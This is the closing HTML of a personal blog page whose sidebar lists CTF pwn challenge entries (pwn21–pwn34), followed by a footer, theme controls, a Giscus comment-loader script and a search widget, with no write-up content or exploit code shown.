href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-3"><span class="toc-number">1.16.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn21"><span class="toc-number">1.17.</span> <span class="toc-text">pwn21</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-4"><span class="toc-number">1.17.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn22"><span class="toc-number">1.18.</span> <span class="toc-text">pwn22</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-5"><span class="toc-number">1.18.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn23"><span class="toc-number">1.19.</span> <span class="toc-text">pwn23</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-6"><span class="toc-number">1.19.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn24"><span class="toc-number">1.20.</span> <span class="toc-text">pwn24</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-7"><span class="toc-number">1.20.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn25"><span class="toc-number">1.21.</span> <span class="toc-text">pwn25</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-8"><span class="toc-number">1.21.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn26"><span class="toc-number">1.22.</span> <span class="toc-text">pwn26</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-9"><span class="toc-number">1.22.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn27"><span class="toc-number">1.23.</span> <span class="toc-text">pwn27</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-10"><span class="toc-number">1.23.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn28"><span class="toc-number">1.24.</span> <span class="toc-text">pwn28</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-11"><span class="toc-number">1.24.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn29"><span class="toc-number">1.25.</span> <span class="toc-text">pwn29</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-12"><span class="toc-number">1.25.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn30"><span class="toc-number">1.26.</span> <span class="toc-text">pwn30</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-13"><span class="toc-number">1.26.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn31"><span class="toc-number">1.27.</span> <span class="toc-text">pwn31</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-14"><span class="toc-number">1.27.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn32"><span class="toc-number">1.28.</span> <span class="toc-text">pwn32</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-15"><span class="toc-number">1.28.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn33"><span class="toc-number">1.29.</span> <span class="toc-text">pwn33</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-16"><span class="toc-number">1.29.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn34"><span class="toc-number">1.30.</span> <span class="toc-text">pwn34</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-17"><span class="toc-number">1.30.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/w4.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Rhea</span></div><div class="footer_custom_text">Hi,welocome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'Rhea006/rhea006.github.io',
      'data-repo-id': 'R_kgDOO6e8Gw',
      'data-category-id': 'DIC_kwDOO6e8G84CtK5G',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="search..." type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>